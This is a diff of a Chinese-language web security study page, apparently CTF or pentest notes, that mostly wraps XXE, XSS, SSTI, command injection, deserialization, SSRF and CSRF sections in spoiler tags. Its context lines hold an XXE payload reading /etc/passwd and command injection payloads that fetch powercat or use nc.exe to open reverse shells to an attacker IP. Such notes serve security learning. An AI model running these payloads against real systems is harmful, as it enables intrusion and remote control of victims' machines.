@@ -408,6 +408,8 @@ date: 2024-02-07
 
 #### XXE - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
 
+<details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>
+
 ```html
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
@@ -419,7 +421,11 @@ date: 2024-02-07
   - 避免不必要的功能開啟
   - 做好輸入驗證和最小權限策略
 
+</details>
+
 #### XSS - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+
+<details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>
 
 ```javascript
 </script><script>
@@ -553,7 +559,11 @@ fetch(`/getflag\)
 
   </details>
 
+</details>
+
 #### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)
+
+<details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>
 
 - 先確認是不是真的有這個問題: {% raw %}`{{7*7}}`{% endraw %} → 49
 - 用[tplmap](https://github.com/epinna/tplmap)直接打
@@ -583,6 +593,8 @@ fetch(`/getflag\)
 
   {% endraw %}
 
+</details>
+
 #### Command Injection
 
 - [feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)
@@ -603,6 +615,7 @@ fetch(`/getflag\)
   ```
 - 上傳 webshell 的 Payload
   - Powershell:
+    <details markdown="1"><summary><span class="spoiler">Steps</span></summary>
 
     ```powershell
     $ powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/powercat.ps1');powercat -c KALI_IP -p 4444 -e cmd"
@@ -623,7 +636,10 @@ fetch(`/getflag\)
     $ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<攻擊者IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<攻擊者IP>%20-p%204444%20-e%20powershell' http://<受害者IP>/archive
     ```
 
+    </details>
+
   - CMD: 這個方法不見得有用，因為可能我們
+    <details markdown="1"><summary><span class="spoiler">Steps</span></summary>
 
     ```bash
     # 第一次: 下載到一個指定地址
@@ -634,6 +650,8 @@ fetch(`/getflag\)
     # C:\Windows\Temp\nc.exe -e cmd.exe <攻擊者IP> 4444
     $ curl -X POST --data 'Archive=git%3BC%3A%5CWindows%5CTemp%5Cnc.exe%20-e%20cmd.exe%20<攻擊者IP>%204444' http://<受害者IP>/archive
     ```
+
+    </details>
 
 ### 讀擋
 
@@ -801,6 +819,9 @@ $ curl -k "http://<victim server IP>/meteor/index.php?page=http://<自己的 IP>
 
 ### Deserialization
 
+<details markdown="1">
+<summary><span class="spoiler">暫時隱藏</span></summary>
+
 要能夠達成 insecure 的反序列化，最重要的兩個前提是
 
 - 反序列化的資料可控
@@ -812,9 +833,6 @@ $ curl -k "http://<victim server IP>/meteor/index.php?page=http://<自己的 IP>
   - [PHPGGC: PHP Generic Gadget Chains](https://github.com/ambionics/phpggc): 可以直接看對應的 PHP 框架有沒有對應的 payload 達到 RCE
   - [ysoserial](https://github.com/frohoff/ysoserial): 紀錄 JAVA 版本的 POP chain gadgets
   - [ysoserial.net](https://github.com/pwntester/ysoserial.net)
-
-<details markdown="1">
-<summary><span class="spoiler">Table</span></summary>
 
 | 語言   | 序列化         | 反序列化       | Magic Method                             |
 | ------ | -------------- | -------------- | ---------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
@@ -831,6 +849,8 @@ $ curl -k "http://<victim server IP>/meteor/index.php?page=http://<自己的 IP>
 
 ### SSRF
 
+<details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>
+
 create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓這個中間 server 因為我的偽造 payload 而同意讓我和更裡面的內網 server 溝通，這樣我就打到 inner server，如果有 preview card 這樣的網站要特別注意有沒有 SSRF 的問題
 
 - 利用 gopher 協議建一個偽造 payload
@@ -841,7 +861,11 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
   - 使用安全的 HTTP client → 設定 timeout、最大連線數、禁用不必要的協議（FTP、file://、gopher:// 等）。
   - 對特殊情境使用代理 / sandbox
 
+</details>
+
 ### CSRF(Cross-Site Request Frogery)
+
+<details markdown="1"><summary><span class="spoiler">暫時隱藏</span></summary>
 
 - [[Day25]- 新手的 Web 系列 CSRF](https://ithelp.ithome.com.tw/articles/10251769)
   > 1. 使用者登入網站
@@ -890,6 +914,8 @@ create 一個偽造的 payload 和一個對外的中間 server 溝通，並讓�
 - 敏感操作使用 POST
 
   前面的 payload 範例有提到很多都是透過 GET qeury 進行惡意操作，那麼我們只要把敏感操作都利用 POST 的方式處理，就可以大大降低 CSRF 發生的情況
+
+</details>
 
 ### Upload
 
